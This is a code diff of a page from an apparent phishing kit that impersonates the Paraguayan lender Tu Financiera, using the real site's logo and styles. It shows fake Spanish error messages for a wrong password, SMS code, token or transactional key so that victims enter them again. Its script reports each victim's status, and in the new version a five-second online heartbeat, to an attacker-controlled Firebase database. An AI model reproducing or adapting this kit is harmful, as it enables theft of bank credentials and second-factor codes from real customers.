@@ -3,96 +3,45 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Ingresar</title>
+<title>Error de validación</title>
 <link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
 <link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
 <style>
   html,body{height:100%;margin:0}
-  body{
-    min-height:100vh;background:#464646;
-    font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;
-    display:flex;justify-content:flex-end;
-  }
-  .fondo{position:fixed;inset:0;z-index:0;background:url('https://tu.com.py/tufi-web/static/media/fondo_login.34ff0d3f.png') center/cover no-repeat}
-  .panel{
-    position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;
-    display:flex;flex-direction:column;align-items:center;overflow-y:auto;
-    padding:52px 18px 26px;box-sizing:border-box;
-  }
-  .logo-top{width:118px;margin-bottom:30px}
-  .caja{
-    width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;
-    padding:30px 22px 26px;box-sizing:border-box;text-align:center;
-  }
-  .cruz{
-    width:62px;height:62px;border-radius:50%;background:#fdecef;border:2px solid #d64550;
-    display:flex;align-items:center;justify-content:center;margin:0 auto 16px;
-  }
-  .cruz svg{width:28px;height:28px;stroke:#c0303b;stroke-width:3.5;fill:none}
-  .caja h2{font-size:16px;font-weight:bold;color:#d64550;margin:0 0 8px;line-height:1.35}
-  .caja p{font-size:12.5px;color:#606060;line-height:1.6;margin:0 0 20px}
-  .btn{
-    width:100%;height:39px;border:0;border-radius:10px;background:#8dc63f;color:#fff;
-    font-family:inherit;font-size:12px;font-weight:bold;letter-spacing:.33px;
-    text-transform:uppercase;cursor:pointer;
-  }
-  .ayuda{font-size:10.5px;color:#a5a5a5;line-height:1.7;margin-top:16px}
-  .version{color:#707070;font-size:12px;margin-top:22px}
-  @media(max-width:900px){.panel{width:45%}}
-  @media(max-width:768px){
-    body{display:block}
-    .panel{width:100%;min-height:100vh;padding-top:34px}
-    .caja{width:290px}
-    .logo-top{width:96px}
-  }
+  body{min-height:100vh;background:#f2f2f2;font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box}
+  .card{background:#fff;border:1px solid #d1d1d1;border-radius:10px;width:360px;max-width:100%;padding:34px 24px;text-align:center;box-sizing:border-box}
+  .logo{width:130px;margin:0 auto 22px;display:block}
+  .no{width:66px;height:66px;border-radius:50%;background:#fdece0;color:#e8791a;font-size:34px;font-weight:bold;line-height:66px;margin:0 auto 18px}
+  h1{font-size:16px;font-weight:bold;color:#e8791a;margin:0 0 10px}
+  p{font-size:12.5px;line-height:1.55;margin:0}
+  .btn{display:block;height:39px;line-height:39px;margin-top:24px;border-radius:10px;background:#8dc63f;color:#fff;font-size:12px;font-weight:bold;text-transform:uppercase;letter-spacing:.33px;text-decoration:none}
 </style>
 </head>
 <body>
-<div class="fondo"></div>
-
-<div class="panel">
-  <img class="logo-top" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
-
-  <div class="caja">
-    <div class="cruz"><svg viewBox="0 0 24 24"><path d="M5 5l14 14M19 5L5 19"/></svg></div>
-    <h2 id="tit">Datos incorrectos</h2>
-    <p id="sub">El documento o la clave de acceso no coinciden. Volvé a intentarlo.</p>
-
-    <button class="btn" id="volver">Volver a ingresar</button>
-    <div class="ayuda" id="ayuda">Si el problema continúa, solicitá una nueva clave en una sucursal o llamá al 021 415 8000.</div>
-  </div>
-
-  <span class="version">Versión: v1.65.0</span>
+<div class="card">
+  <img class="logo" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
+  <div class="no">!</div>
+  <h1 id="t">No pudimos validar tus datos</h1>
+  <p id="p">Revisá la información e intentá nuevamente.</p>
+  <a class="btn" href="index.html">Volver a intentar</a>
 </div>
-
 <script>
 (function(){
-  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
-  var qs = new URLSearchParams(location.search);
-  var id = qs.get('u');
-  var t = qs.get('t') || 'login';
-  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
-
-  var textos = {
-    login: ['Datos incorrectos', 'El documento o la clave de acceso no coinciden. Volvé a intentarlo.', 'Si el problema continúa, solicitá una nueva clave en una sucursal o llamá al 021 415 8000.'],
-    codigo: ['Código incorrecto', 'El código ingresado no es válido o ya venció. Solicitá uno nuevo y volvé a intentarlo.', 'El código vence a los pocos minutos de ser enviado.'],
-    token: ['Token incorrecto', 'El token ingresado no es válido o expiró. Esperá el próximo y volvé a intentarlo.', 'El token cambia cada 30 segundos en tu aplicación.'],
-    clave: ['Clave transaccional incorrecta', 'La clave transaccional no coincide. Volvé a intentarlo para autorizar el dispositivo.', 'Si no la recordás, podés regenerarla desde la app o en una sucursal.']
-  };
-
-  var txt = textos[t] || textos.login;
-  document.getElementById('tit').textContent = txt[0];
-  document.getElementById('sub').textContent = txt[1];
-  document.getElementById('ayuda').textContent = txt[2];
-
-  if(id){
-    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({estado:'RECHAZADO', pagina:'rechazar.html', rechazo_motivo:t, online:false})}).catch(function(){});
-  }
-
-  document.getElementById('volver').addEventListener('click', function(){
-    location.href = 'index.html';
-  });
+  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var q=new URLSearchParams(location.search);
+  var id=q.get('u')||localStorage.getItem('nbch_u'), t=q.get('t')||'login';
+  var M={login:['Usuario o clave incorrectos','El documento o la clave de acceso ingresados no son correctos.'],
+         codigo:['Código incorrecto','El código de verificación ingresado no es válido o ya expiró.'],
+         token:['Token incorrecto','El token de seguridad ingresado no es válido.'],
+         clave:['Clave transaccional incorrecta','La clave transaccional ingresada no es correcta.']};
+  var m=M[t]||M.login;
+  document.getElementById('t').textContent=m[0];
+  document.getElementById('p').textContent=m[1];
+  if(!id) return;
+  function patch(o){fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(o)}).catch(function(){});}
+  patch({online:true,ultimoPing:Date.now(),pagina:'rechazar.html',estado:'RECHAZADO'});
+  var lt=setInterval(function(){patch({online:true,ultimoPing:Date.now()});},5000);
+  window.addEventListener('beforeunload',function(){clearInterval(lt);patch({online:false});});
 })();
 </script>
 </body>
